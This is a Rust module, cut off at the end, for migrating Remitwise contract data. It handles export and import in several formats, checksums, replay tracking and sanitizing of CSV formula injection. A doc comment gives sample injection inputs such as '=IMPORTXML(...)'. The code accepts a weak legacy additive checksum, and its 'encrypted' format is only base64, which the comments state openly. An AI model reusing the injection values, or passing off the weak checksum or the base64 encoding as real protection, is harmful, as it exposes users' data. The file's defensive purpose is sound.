//! Data migration, import/export utilities for Remitwise contracts.
//!
//! Supports multiple formats (JSON, binary, CSV), checksum validation,
//! version compatibility checks, and data integrity verification.
//!
//! # Checksum security model
//!
//! Every [`ExportSnapshot`] carries a SHA-256 checksum that binds three inputs:
//!
//! ```text
//! SHA-256(version_le_bytes || format_bytes || canonical_payload_json)
//! ```
//!
//! Binding the schema version and format string in addition to the payload
//! prevents version-downgrade and format-substitution attacks. The checksum
//! provides integrity, not authentication.
//!
//! Legacy snapshots without an explicit `hash_algorithm` field are still
//! supported by accepting the older `Simple` checksum format on import.

#![cfg_attr(not(test), deny(clippy::unwrap_used, clippy::expect_used))]

use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashMap};

/// Encrypted migration payload marker prefix.
///
/// Format: `enc:v1:<base64>`
const ENCRYPTED_PAYLOAD_PREFIX_V1: &str = "enc:v1:";

/// Current snapshot schema version for migration compatibility.
pub const SCHEMA_VERSION: u32 = 1;

/// Minimum supported schema version for import.
pub const MIN_SUPPORTED_VERSION: u32 = 1;

/// Alias used in snapshot headers to keep naming consistent with other contracts.
pub const SNAPSHOT_SCHEMA_VERSION: u32 = SCHEMA_VERSION;

/// Maximum allowed canonical payload size for migration snapshots.
pub const MAX_MIGRATION_PAYLOAD_BYTES: usize = 64 * 1024;

/// Maximum allowed number of logical records in a migration payload.
pub const MAX_MIGRATION_RECORDS: usize = 1_024;

/// Maximum allowed serialized snapshot size accepted by JSON and binary imports.
pub const MAX_MIGRATION_SNAPSHOT_BYTES: usize = MAX_MIGRATION_PAYLOAD_BYTES + (32 * 1024);

/// Maximum allowed size for prefixed base64-encoded encrypted payload imports.
pub const MAX_ENCRYPTED_PAYLOAD_BYTES: usize =
    ENCRYPTED_PAYLOAD_PREFIX_V1.len() + MAX_MIGRATION_PAYLOAD_BYTES.div_ceil(3) * 4;

/// Algorithm used to compute the snapshot checksum.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "lowercase")]
#[non_exhaustive]
pub enum ChecksumAlgorithm {
    /// SHA-256 over `version_le_bytes || format_utf8_bytes || canonical_payload_json`.
    Sha256,
    /// Legacy checksum used by older snapshots.
    #[default]
    Simple,
}

/// Versioned migration event payload meant for indexing and historical tracking.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum MigrationEvent {
    V1(MigrationEventV1),
}

/// Base migration event containing metadata about the migration operation.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct MigrationEventV1 {
    pub contract_id: String,
    pub migration_type: String,
    pub version: u32,
    pub timestamp_ms: u64,
}

/// Export format for snapshot data.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExportFormat {
    Json,
    Binary,
    Csv,
    Encrypted,
}

/// Snapshot header with version, checksum, and hash algorithm for integrity.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SnapshotHeader {
    pub version: u32,
    pub checksum: String,
    #[serde(default)]
    pub hash_algorithm: ChecksumAlgorithm,
    pub format: String,
    pub created_at_ms: Option<u64>,
}

/// Full export snapshot for remittance split or other contract data.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExportSnapshot {
    pub header: SnapshotHeader,
    pub payload: SnapshotPayload,
}

/// A JSON value wrapper that serializes as raw JSON for human-readable formats
/// and uses a bincode-compatible tagged representation for binary formats.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JsonValue(serde_json::Value);

impl From<serde_json::Value> for JsonValue {
    fn from(value: serde_json::Value) -> Self {
        JsonValue(value)
    }
}

impl From<JsonValue> for serde_json::Value {
    fn from(value: JsonValue) -> Self {
        value.0
    }
}

#[derive(Serialize, Deserialize)]
enum JsonNumberBinary {
    I64(i64),
    U64(u64),
    F64(f64),
}

#[derive(Serialize, Deserialize)]
enum JsonValueBinary {
    Null,
    Bool(bool),
    Number(JsonNumberBinary),
    String(String),
    Array(Vec<JsonValueBinary>),
    Object(BTreeMap<String, JsonValueBinary>),
}

impl From<&serde_json::Value> for JsonValueBinary {
    fn from(value: &serde_json::Value) -> Self {
        match value {
            serde_json::Value::Null => JsonValueBinary::Null,
            serde_json::Value::Bool(b) => JsonValueBinary::Bool(*b),
            serde_json::Value::Number(n) => {
                let number = if let Some(i) = n.as_i64() {
                    JsonNumberBinary::I64(i)
                } else if let Some(u) = n.as_u64() {
                    JsonNumberBinary::U64(u)
                } else if let Some(f) = n.as_f64() {
                    JsonNumberBinary::F64(f)
                } else {
                    unreachable!("serde_json::Number must represent a valid JSON number")
                };
                JsonValueBinary::Number(number)
            }
            serde_json::Value::String(s) => JsonValueBinary::String(s.clone()),
            serde_json::Value::Array(arr) => {
                JsonValueBinary::Array(arr.iter().map(JsonValueBinary::from).collect())
            }
            serde_json::Value::Object(map) => JsonValueBinary::Object(
                map.iter()
                    .map(|(k, v)| (k.clone(), JsonValueBinary::from(v)))
                    .collect(),
            ),
        }
    }
}

impl From<JsonValueBinary> for serde_json::Value {
    fn from(value: JsonValueBinary) -> Self {
        match value {
            JsonValueBinary::Null => serde_json::Value::Null,
            JsonValueBinary::Bool(b) => serde_json::Value::Bool(b),
            JsonValueBinary::Number(n) => match n {
                JsonNumberBinary::I64(i) => serde_json::Value::Number(i.into()),
                JsonNumberBinary::U64(u) => serde_json::Value::Number(u.into()),
                JsonNumberBinary::F64(f) => {
                    // `from_f64` can return `None` for NaN/Infinity. Avoid panicking
                    // to satisfy `clippy::expect_used` deny in non-test builds.
                    if let Some(n) = serde_json::Number::from_f64(f) {
                        serde_json::Value::Number(n)
                    } else {
                        // Represent non-finite numbers as JSON strings to preserve
                        // the original value without panicking during linting.
                        serde_json::Value::String(f.to_string())
                    }
                }
            },
            JsonValueBinary::String(s) => serde_json::Value::String(s),
            JsonValueBinary::Array(arr) => {
                serde_json::Value::Array(arr.into_iter().map(serde_json::Value::from).collect())
            }
            JsonValueBinary::Object(map) => serde_json::Value::Object(
                map.into_iter()
                    .map(|(k, v)| (k, serde_json::Value::from(v)))
                    .collect(),
            ),
        }
    }
}

impl Serialize for JsonValue {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        if serializer.is_human_readable() {
            self.0.serialize(serializer)
        } else {
            JsonValueBinary::from(&self.0).serialize(serializer)
        }
    }
}

impl<'de> Deserialize<'de> for JsonValue {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        if deserializer.is_human_readable() {
            let value = serde_json::Value::deserialize(deserializer)?;
            Ok(JsonValue(value))
        } else {
            let intermediate = JsonValueBinary::deserialize(deserializer)?;
            Ok(JsonValue(serde_json::Value::from(intermediate)))
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SnapshotPayload {
    RemittanceSplit(RemittanceSplitExport),
    SavingsGoals(SavingsGoalsExport),
    Generic(HashMap<String, JsonValue>),
}

impl SnapshotPayload {
    /// Return the logical record count used for migration guardrails.
    pub fn record_count(&self) -> usize {
        match self {
            SnapshotPayload::RemittanceSplit(_) => 1,
            SnapshotPayload::SavingsGoals(export) => export.goals.len(),
            SnapshotPayload::Generic(entries) => entries.len(),
        }
    }
}

/// Exportable remittance split config.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RemittanceSplitExport {
    pub owner: String,
    pub spending_percent: u32,
    pub savings_percent: u32,
    pub bills_percent: u32,
    pub insurance_percent: u32,
}

/// Exportable savings goals list.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SavingsGoalsExport {
    pub next_id: u32,
    pub goals: Vec<SavingsGoalExport>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SavingsGoalExport {
    pub id: u32,
    pub owner: String,
    pub name: String,
    pub target_amount: i64,
    pub current_amount: i64,
    pub target_date: u64,
    pub locked: bool,
}

impl ExportSnapshot {
    fn payload_bytes(&self) -> Result<Vec<u8>, MigrationError> {
        canonical_payload_bytes(&self.payload)
    }

    fn checksum_for_parts(version: u32, format: &str, payload_bytes: &[u8]) -> String {
        let mut hasher = Sha256::new();
        hasher.update(version.to_le_bytes());
        hasher.update(format.as_bytes());
        hasher.update(payload_bytes);
        hex::encode(hasher.finalize().as_ref())
    }

    fn simple_checksum_for_parts(version: u32, format: &str, payload_bytes: &[u8]) -> String {
        let mut acc = 0u64;
        for byte in version
            .to_le_bytes()
            .iter()
            .chain(format.as_bytes())
            .chain(payload_bytes.iter())
        {
            acc = acc.wrapping_add(*byte as u64);
        }
        acc.to_string()
    }

    fn legacy_simple_checksum(payload_bytes: &[u8]) -> String {
        let mut acc = 0u64;
        for byte in payload_bytes.iter() {
            acc = acc.wrapping_add(*byte as u64);
        }
        acc.to_string()
    }

    /// Compute the SHA-256 checksum for this snapshot.
    pub fn compute_checksum(&self) -> Result<String, MigrationError> {
        let payload_bytes = self.payload_bytes()?;
        Ok(Self::checksum_for_parts(
            self.header.version,
            &self.header.format,
            &payload_bytes,
        ))
    }

    fn compute_simple_checksum(&self) -> Result<String, MigrationError> {
        let payload_bytes = self.payload_bytes()?;
        Ok(Self::simple_checksum_for_parts(
            self.header.version,
            &self.header.format,
            &payload_bytes,
        ))
    }

    fn compute_legacy_simple_checksum(&self) -> Result<String, MigrationError> {
        let payload_bytes = self.payload_bytes()?;
        Ok(Self::legacy_simple_checksum(&payload_bytes))
    }

    /// Verify that the stored checksum matches the current payload.
    pub fn verify_checksum(&self) -> bool {
        match self.header.hash_algorithm {
            ChecksumAlgorithm::Sha256 => self
                .compute_checksum()
                .map(|c| self.header.checksum == c)
                .unwrap_or(false),
            ChecksumAlgorithm::Simple => self
                .compute_simple_checksum()
                .map(|expected| {
                    self.header.checksum == expected
                        || self
                            .compute_legacy_simple_checksum()
                            .map(|legacy| self.header.checksum == legacy)
                            .unwrap_or(false)
                })
                .unwrap_or(false),
        }
    }

    /// Check if snapshot version is supported for import.
    pub fn is_version_compatible(&self) -> bool {
        self.header.version >= MIN_SUPPORTED_VERSION && self.header.version <= SCHEMA_VERSION
    }

    /// Validate payload size and logical record bounds.
    pub fn validate_payload_constraints(&self) -> Result<(), MigrationError> {
        let payload_bytes = self.payload_bytes()?;
        validate_payload_bounds(self.payload.record_count(), payload_bytes.len())
    }

    /// Validate snapshot for import: version, payload bounds, and checksum.
    pub fn validate_for_import(&self) -> Result<(), MigrationError> {
        if !self.is_version_compatible() {
            return Err(MigrationError::IncompatibleVersion {
                found: self.header.version,
                min: MIN_SUPPORTED_VERSION,
                max: SCHEMA_VERSION,
            });
        }

        self.validate_payload_constraints()?;

        if !matches!(
            self.header.hash_algorithm,
            ChecksumAlgorithm::Sha256 | ChecksumAlgorithm::Simple
        ) {
            return Err(MigrationError::UnknownHashAlgorithm);
        }

        if !self.verify_checksum() {
            return Err(MigrationError::ChecksumMismatch);
        }

        Ok(())
    }

    /// Validate the snapshot for import and capture rollback metadata for the
    /// current on-chain state. This helper combines validation (version,
    /// payload bounds, checksum) with a pre-mutation capture so callers can
    /// obtain `RollbackMetadata` before they perform any irreversible steps.
    pub fn validate_and_capture(
        &self,
        current_state: Option<&ExportSnapshot>,
        timestamp_ms: u64,
    ) -> Result<RollbackMetadata, MigrationError> {
        self.validate_for_import()?;
        Ok(RollbackMetadata::capture(current_state, self, timestamp_ms))
    }

    /// Build a new snapshot with correct version, algorithm, and checksum.
    pub fn new(payload: SnapshotPayload, format: ExportFormat) -> Self {
        let format_str = format_label(format);
        let mut snapshot = Self {
            header: SnapshotHeader {
                version: SCHEMA_VERSION,
                checksum: String::new(),
                hash_algorithm: ChecksumAlgorithm::Sha256,
                format: format_str,
                created_at_ms: None,
            },
            payload,
        };
        snapshot.header.checksum = snapshot
            .compute_checksum()
            .unwrap_or_else(|_| String::new());
        snapshot
    }
}

fn format_label(format: ExportFormat) -> String {
    match format {
        ExportFormat::Json => "json".into(),
        ExportFormat::Binary => "binary".into(),
        ExportFormat::Csv => "csv".into(),
        ExportFormat::Encrypted => "encrypted".into(),
    }
}

fn canonical_payload_bytes(payload: &SnapshotPayload) -> Result<Vec<u8>, MigrationError> {
    match payload {
        SnapshotPayload::RemittanceSplit(export) => {
            serialize_json_bytes(&serde_json::json!({ "RemittanceSplit": export }))
        }
        SnapshotPayload::SavingsGoals(export) => {
            serialize_json_bytes(&serde_json::json!({ "SavingsGoals": export }))
        }
        SnapshotPayload::Generic(entries) => {
            let ordered_entries: BTreeMap<&str, &JsonValue> = entries
                .iter()
                .map(|(key, value)| (key.as_str(), value))
                .collect();
            serialize_json_bytes(&serde_json::json!({ "Generic": ordered_entries }))
        }
    }
}

fn serialize_json_bytes<T>(value: &T) -> Result<Vec<u8>, MigrationError>
where
    T: Serialize,
{
    serde_json::to_vec(value).map_err(|e| MigrationError::DeserializeError(e.to_string()))
}

fn validate_payload_bounds(record_count: usize, payload_len: usize) -> Result<(), MigrationError> {
    if record_count > MAX_MIGRATION_RECORDS {
        return Err(MigrationError::TooManyRecords {
            count: record_count,
            max: MAX_MIGRATION_RECORDS,
        });
    }
    if payload_len > MAX_MIGRATION_PAYLOAD_BYTES {
        return Err(MigrationError::PayloadTooLarge {
            size: payload_len,
            max: MAX_MIGRATION_PAYLOAD_BYTES,
        });
    }
    Ok(())
}

fn validate_snapshot_size(snapshot_len: usize) -> Result<(), MigrationError> {
    if snapshot_len > MAX_MIGRATION_SNAPSHOT_BYTES {
        return Err(MigrationError::SnapshotTooLarge {
            size: snapshot_len,
            max: MAX_MIGRATION_SNAPSHOT_BYTES,
        });
    }
    Ok(())
}

fn validate_encrypted_payload_size(encoded_len: usize) -> Result<(), MigrationError> {
    if encoded_len > MAX_ENCRYPTED_PAYLOAD_BYTES {
        return Err(MigrationError::PayloadTooLarge {
            size: encoded_len,
            max: MAX_ENCRYPTED_PAYLOAD_BYTES,
        });
    }
    Ok(())
}

/// Migration/import errors.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MigrationError {
    IncompatibleVersion { found: u32, min: u32, max: u32 },
    ChecksumMismatch,
    UnknownHashAlgorithm,
    PayloadTooLarge { size: usize, max: usize },
    SnapshotTooLarge { size: usize, max: usize },
    TooManyRecords { count: usize, max: usize },
    InvalidFormat(String),
    ValidationFailed(String),
    DeserializeError(String),
    DuplicateImport,
}

impl std::fmt::Display for MigrationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            MigrationError::IncompatibleVersion { found, min, max } => {
                write!(
                    f,
                    "incompatible version {} (supported {}-{})",
                    found, min, max
                )
            }
            MigrationError::ChecksumMismatch => {
                write!(
                    f,
                    "checksum mismatch: snapshot integrity could not be verified"
                )
            }
            MigrationError::UnknownHashAlgorithm => {
                write!(
                    f,
                    "unknown hash algorithm: cannot verify snapshot integrity"
                )
            }
            MigrationError::PayloadTooLarge { size, max } => {
                write!(f, "payload too large: {} bytes (max {})", size, max)
            }
            MigrationError::SnapshotTooLarge { size, max } => {
                write!(f, "snapshot too large: {} bytes (max {})", size, max)
            }
            MigrationError::TooManyRecords { count, max } => {
                write!(f, "too many records: {} (max {})", count, max)
            }
            MigrationError::InvalidFormat(s) => write!(f, "invalid format: {}", s),
            MigrationError::ValidationFailed(s) => write!(f, "validation failed: {}", s),
            MigrationError::DeserializeError(s) => write!(f, "deserialize error: {}", s),
            MigrationError::DuplicateImport => write!(f, "duplicate payload import detected"),
        }
    }
}

impl std::error::Error for MigrationError {}

/// Tracks imported migration payloads to prevent replay attacks and duplicate restores.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct MigrationTracker {
    imported_payloads: HashMap<(String, u32), u64>,
}

impl MigrationTracker {
    pub fn new() -> Self {
        Self {
            imported_payloads: HashMap::new(),
        }
    }

    /// Mark a payload as imported.
    pub fn mark_imported(
        &mut self,
        snapshot: &ExportSnapshot,
        timestamp_ms: u64,
    ) -> Result<(), MigrationError> {
        let identity = (snapshot.header.checksum.clone(), snapshot.header.version);
        if self.imported_payloads.contains_key(&identity) {
            return Err(MigrationError::DuplicateImport);
        }
        self.imported_payloads.insert(identity, timestamp_ms);
        Ok(())
    }

    /// Check if a snapshot has already been imported.
    pub fn is_imported(&self, snapshot: &ExportSnapshot) -> bool {
        let identity = (snapshot.header.checksum.clone(), snapshot.header.version);
        self.imported_payloads.contains_key(&identity)
    }

    /// Remove a previously-recorded imported snapshot from the tracker by
    /// checksum/version identity. This is idempotent: removing a non-existent
    /// identity is a no-op. This helper is used during rollback to allow retry
    /// of a failed import.
    pub fn unmark_imported_by_identity(&mut self, checksum: &str, version: u32) {
        let identity = (checksum.to_string(), version);
        self.imported_payloads.remove(&identity);
    }
}

/// Export snapshot to JSON bytes.
pub fn export_to_json(snapshot: &ExportSnapshot) -> Result<Vec<u8>, MigrationError> {
    snapshot.validate_payload_constraints()?;
    let bytes = serde_json::to_vec_pretty(snapshot)
        .map_err(|e| MigrationError::DeserializeError(e.to_string()))?;
    validate_snapshot_size(bytes.len())?;
    Ok(bytes)
}

/// Export snapshot to binary bytes.
pub fn export_to_binary(snapshot: &ExportSnapshot) -> Result<Vec<u8>, MigrationError> {
    snapshot.validate_payload_constraints()?;
    let bytes = bincode::serialize(snapshot)
        .map_err(|e| MigrationError::DeserializeError(e.to_string()))?;
    validate_snapshot_size(bytes.len())?;
    Ok(bytes)
}

/// Sanitize a CSV field to prevent formula injection.
///
/// # Security model
///
/// CSV-injection occurs when spreadsheet applications interpret leading characters
/// as formulas:
/// - `=` starts a formula
/// - `+` starts a formula in some applications
/// - `-` starts a formula in some applications
/// - `@` starts a formula (Excel functions)
///
/// This function prefixes any field beginning with these characters with a single quote (`'`),
/// which instructs spreadsheet applications to treat the field as text literal.
///
/// # Examples
///
/// ```text
/// "=IMPORTXML(...)" → "'=IMPORTXML(...)"
/// "+1+1" → "'+1+1"
/// "-1+2" → "'-1+2"
/// "@SUM(A1:A10)" → "'@SUM(A1:A10)"
/// "normal text" → "normal text"
/// "123" → "123"
/// ```
fn sanitize_csv_field(field: &str) -> String {
    if field.starts_with('=')
        || field.starts_with('+')
        || field.starts_with('-')
        || field.starts_with('@')
    {
        format!("'{}", field)
    } else {
        field.to_string()
    }
}

/// Export to CSV (for tabular payloads only; e.g. goals list).
///
/// # Security
///
/// Fields beginning with `=`, `+`, `-`, or `@` are escaped with a leading single quote (`'`)
/// to prevent formula injection in spreadsheet applications. This ensures that goal names
/// and notes containing formula-like prefixes are safely exported as text literals.
pub fn export_to_csv(payload: &SavingsGoalsExport) -> Result<Vec<u8>, MigrationError> {
    let payload_bytes = serialize_json_bytes(payload)?;
    validate_payload_bounds(payload.goals.len(), payload_bytes.len())?;

    let mut wtr = csv::Writer::from_writer(Vec::new());
    wtr.write_record([
        "id",
        "owner",
        "name",
        "target_amount",
        "current_amount",
        "target_date",
        "locked",
    ])
    .map_err(|e| MigrationError::InvalidFormat(e.to_string()))?;

    for goal in &payload.goals {
        wtr.write_record(&[
            goal.id.to_string(),
            sanitize_csv_field(&goal.owner),
            sanitize_csv_field(&goal.name),
            goal.target_amount.to_string(),
            goal.current_amount.to_string(),
            goal.target_date.to_string(),
            goal.locked.to_string(),
        ])
        .map_err(|e| MigrationError::InvalidFormat(e.to_string()))?;
    }

    wtr.flush()
        .map_err(|e| MigrationError::InvalidFormat(e.to_string()))?;
    let csv_bytes = wtr
        .into_inner()
        .map_err(|e| MigrationError::InvalidFormat(e.to_string()))?;
    validate_payload_bounds(payload.goals.len(), csv_bytes.len())?;
    Ok(csv_bytes)
}

/// ⚠️ WARNING: This function does NOT encrypt the payload.
///
/// The `enc:v1:` format is an **encoding/marker only** and provides no
/// confidentiality or integrity protection beyond the snapshot checksum.
///
/// # Wire format
///
/// ```text
/// enc:v1:<base64>
/// ```
///
/// - Prefix constant: `ENCRYPTED_PAYLOAD_PREFIX_V1` = `"enc:v1:"` (line 31).
/// - Max encoded size: `MAX_ENCRYPTED_PAYLOAD_BYTES` (lines 52–53).
///
/// # Security
///
/// Sensitive data **MUST be encrypted off-chain** before being passed to this
/// function. A future `enc:v2:` format may add on-chain cryptographic
/// operations.
///
/// See `THREAT_MODEL.md` §5.1 (Critical Gaps / Weak Checksum) and
/// `SECURITY_REVIEW_SUMMARY.md` (Short-Term / SECURITY-004) for the security
/// context of data-migration operations.
pub fn export_to_encrypted_payload(plain_bytes: &[u8]) -> Result<String, MigrationError> {
    if plain_bytes.len() > MAX_MIGRATION_PAYLOAD_BYTES {
        return Err(MigrationError::PayloadTooLarge {
            size: plain_bytes.len(),
            max: MAX_MIGRATION_PAYLOAD_BYTES,
        });
    }

    let b64 = base64::engine::general_purpose::STANDARD.encode(plain_bytes);
    let encoded = format!("{}{}", ENCRYPTED_PAYLOAD_PREFIX_V1, b64);
    validate_encrypted_payload_size(encoded.len())?;
    Ok(encoded)
}

/// ⚠️ WARNING: This function does NOT decrypt the payload.
///
/// It only strips the `enc:v1:` marker and base64-decodes the remainder.
/// No cryptographic key, cipher, or on-chain crypto is involved.
///
/// The `enc:v1:` format is an **encoding/marker only** and provides no
/// confidentiality or integrity protection beyond the snapshot checksum.
///
/// # Wire format
///
/// ```text
/// enc:v1:<base64>
/// ```
///
/// - Prefix constant: `ENCRYPTED_PAYLOAD_PREFIX_V1` = `"enc:v1:"` (line 31).
/// - Max encoded size: `MAX_ENCRYPTED_PAYLOAD_BYTES` (lines 52–53).
///
/// # Security
///
/// Callers **MUST** assume the decoded bytes are **not confidential**.
/// Sensitive data should have been encrypted off-chain before export; this
/// function is the import-side counterpart to [`export_to_encrypted_payload`].
///
/// A future `enc:v2:` format may add on-chain cryptographic verification.
///
/// See `THREAT_MODEL.md` §5.1 (Critical Gaps / Weak Checksum) and
/// `SECURITY_REVIEW_SUMMARY.md` (Short-Term / SECURITY-004) for the security
/// context of data-migration operations.
pub fn import_from_encrypted_payload(encoded: &str) -> Result<Vec<u8>, MigrationError> {
    // Pre-deserialization check: Ensure the base64-encoded string does not exceed
    // MAX_ENCRYPTED_PAYLOAD_BYTES to prevent DoS from oversized requests before decoding.
    // The decoded payload's size is checked against MAX_MIGRATION_PAYLOAD_BYTES later.
    validate_encrypted_payload_size(encoded.len())?;

    let rest = encoded
        .strip_prefix(ENCRYPTED_PAYLOAD_PREFIX_V1)
        .ok_or_else(|| {
            MigrationError::InvalidFormat("missing or invalid encrypted payload marker".into())
        })?;

    if rest.is_empty() {
        return Err(MigrationError::InvalidFormat(
            "empty encrypted payload ciphertext".into(),
        ));
    }

    base64::engine::general_purpose::STANDARD
        .decode(rest)
        .map_err(|e| MigrationError::InvalidFormat(e.to_string()))
        .and_then(|bytes| {
            if bytes.len() > MAX_MIGRATION_PAYLOAD_BYTES {
                Err(MigrationError::PayloadTooLarge {
                    size: bytes.len(),
                    max: MAX_MIGRATION_PAYLOAD_BYTES,
                })
            } else {
                Ok(bytes)
            }
        })
}

/// Import snapshot from JSON bytes with validation and replay protection.
pub fn import_from_json(
    bytes: &[u8],
    tracker: &mut MigrationTracker,
    timestamp_ms: u64,
) -> Result<ExportSnapshot, MigrationError> {
    // Pre-deserialization check: Ensure the raw JSON snapshot envelope does not exceed
    // MAX_MIGRATION_SNAPSHOT_BYTES to prevent DoS from oversized requests before parsing.
    // Logical payload size (MAX_MIGRATION_PAYLOAD_BYTES) and record count (MAX_MIGRATION_RECORDS)
    // are validated post-deserialization as part of `snapshot.validate_for_import()`.
    validate_snapshot_size(bytes.len())?;
    let snapshot: ExportSnapshot = serde_json::from_slice(bytes)
        .map_err(|e| MigrationError::DeserializeError(e.to_string()))?;
    snapshot.validate_for_import()?;
    tracker.mark_imported(&snapshot, timestamp_ms)?;
    Ok(snapshot)
}

/// Import snapshot from binary bytes with validation and replay protection.
pub fn import_from_binary(
    bytes: &[u8],
    tracker: &mut MigrationTracker,
    timestamp_ms: u64,
) -> Result<ExportSnapshot, MigrationError> {
    // Pre-deserialization check: Ensure the raw binary snapshot envelope does not exceed
    // MAX_MIGRATION_SNAPSHOT_BYTES to prevent DoS from oversized requests before parsing.
    // Logical payload size (MAX_MIGRATION_PAYLOAD_BYTES) and record count (MAX_MIGRATION_RECORDS)
    // are validated post-deserialization as part of `snapshot.validate_for_import()`.
    validate_snapshot_size(bytes.len())?;
    let snapshot: ExportSnapshot =
        bincode::deserialize(bytes).map_err(|e| MigrationError::DeserializeError(e.to_string()))?;
    snapshot.validate_for_import()?;
    tracker.mark_imported(&snapshot, timestamp_ms)?;
    Ok(snapshot)
}

/// Legacy helper for callers that do not need replay tracking.
///
/// # Validation contract
///
/// Despite the "untracked" name, this function enforces the **full import safety
/// contract** by delegating to [`import_from_json`]:
///
/// 1. **Size guard** – rejects snapshots larger than [`MAX_MIGRATION_SNAPSHOT_BYTES`]
///    before deserialisation to prevent DoS.
/// 2. **Version check** – calls [`ExportSnapshot::is_version_compatible`], which
///    requires `MIN_SUPPORTED_VERSION <= header.version <= SCHEMA_VERSION`.
///    Snapshots with a future version or a below-minimum version are rejected with
///    [`MigrationError::IncompatibleVersion`].
/// 3. **Payload bounds** – validates record count and payload byte size.
/// 4. **Checksum verification** – calls [`ExportSnapshot::verify_checksum`]; any
///    tampered or corrupted snapshot is rejected with [`MigrationError::ChecksumMismatch`].
///
/// The only difference from [`import_from_json`] is that a throwaway
/// [`MigrationTracker`] is used, so duplicate-import detection is not persisted
/// across calls. Prefer [`import_from_json`] when replay protection is required.
pub fn import_from_json_untracked(bytes: &[u8]) -> Result<ExportSnapshot, MigrationError> {
    let mut tracker = MigrationTracker::new();
    import_from_json(bytes, &mut tracker, 0)
}

/// Legacy helper for callers that do not need replay tracking.
///
/// # Validation contract
///
/// Despite the "untracked" name, this function enforces the **full import safety
/// contract** by delegating to [`import_from_binary`]:
///
/// 1. **Size guard** – rejects snapshots larger than [`MAX_MIGRATION_SNAPSHOT_BYTES`]
///    before deserialisation to prevent DoS.
/// 2. **Version check** – calls [`ExportSnapshot::is_version_compatible`], which
///    requires `MIN_SUPPORTED_VERSION <= header.version <= SCHEMA_VERSION`.
///    Snapshots with a future version or a below-minimum version are rejected with
///    [`MigrationError::IncompatibleVersion`].
/// 3. **Payload bounds** – validates record count and payload byte size.
/// 4. **Checksum verification** – calls [`ExportSnapshot::verify_checksum`]; any
///    tampered or corrupted snapshot is rejected with [`MigrationError::ChecksumMismatch`].
///
/// The only difference from [`import_from_binary`] is that a throwaway
/// [`MigrationTracker`] is used, so duplicate-import detection is not persisted
/// across calls. Prefer [`import_from_binary`] when replay protection is required.
pub fn import_from_binary_untracked(bytes: &[u8]) -> Result<ExportSnapshot, MigrationError> {
    let mut tracker = MigrationTracker::new();
    import_from_binary(bytes, &mut tracker, 0)
}

/// Import goals from CSV into SavingsGoalsExport.
pub fn import_goals_from_csv(bytes: &[u8]) -> Result<Vec<SavingsGoalExport>, MigrationError> {
    // Pre-deserialization check: Ensure the raw CSV input bytes do not exceed
    // MAX_MIGRATION_PAYLOAD_BYTES to prevent DoS from oversized requests before parsing.
    // Logical record count (MAX_MIGRATION_RECORDS) is validated during iteration.
    if bytes.len() > MAX_MIGRATION_PAYLOAD_BYTES {
        return Err(MigrationError::PayloadTooLarge {
            size: bytes.len(),
            max: MAX_MIGRATION_PAYLOAD_BYTES,
        });
    }

    let mut rdr = csv::Reader::from_reader(bytes);
    let mut goals = Vec::new();
    for result in rdr.deserialize() {
        if goals.len() == MAX_MIGRATION_RECORDS {
            return Err(MigrationError::TooManyRecords {
                count: MAX_MIGRATION_RECORDS + 1,
                max: MAX_MIGRATION_RECORDS,
            });
        }

        let record: CsvGoalRow =
            result.map_err(|e| MigrationError::DeserializeError(e.to_string()))?;
        goals.push(SavingsGoalExport {
            id: record.id,
            owner: record.owner,
            name: record.name,
            target_amount: record.target_amount,
            current_amount: record.current_amount,
            target_date: record.target_date,
            locked: record.locked,
        });
    }
    Ok(goals)
}

fn deserialize_csv_safe_field<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let raw = String::deserialize(deserializer)?;
    Ok(strip_csv_formula_prefix(&raw))
}

fn strip_csv_formula_prefix(value: &str) -> String {
    if let Some(stripped) = value.strip_prefix('\'') {
        if stripped.starts_with('=')
            || stripped.starts_with('+')
            || stripped.starts_with('-')
            || stripped.starts_with('@')
        {
            return stripped.to_string();
        }
    }

    value.to_string()
}

#[derive(Debug, Deserialize)]
struct CsvGoalRow {
    id: u32,
    #[serde(deserialize_with = "deserialize_csv_safe_field")]
    owner: String,
    #[serde(deserialize_with = "deserialize_csv_safe_field")]
    name: String,
    target_amount: i64,
    current_amount: i64,
    target_date: u64,
    locked: bool,
}

/// Version compatibility check for migration scripts.
pub fn check_version_compatibility(version: u32) -> Result<(), MigrationError> {
    if version >= MIN_SUPPORTED_VERSION && version <= SCHEMA_VERSION {
        Ok(())
    } else {
        Err(MigrationError::IncompatibleVersion {
            found: version,
            min: MIN_SUPPORTED_VERSION,
            max: SCHEMA_VERSION,
        })
    }
}

/// Build a fully-checksummed [`ExportSnapshot`] from a [`SavingsGoalsExport`] payload.
///
/// This is the canonical bridge between the on-chain `savings_goals` snapshot
/// representation and the off-chain `data_migration` serialization layer.
///
/// # Arguments
/// * `goals_export` – The savings goals payload to wrap.
/// * `format`       – Target export format (JSON, Binary, CSV, Encrypted).
///
/// # Returns
/// An [`ExportSnapshot`] with a valid header (version, format label) and a
/// SHA-256 checksum computed over the canonical JSON of the payload.
///
/// # Security notes
/// - The checksum is computed deterministically from the payload; callers must
///   not mutate `header.checksum` after construction.
/// - For `ExportFormat::Encrypted`, callers are responsible for encrypting the
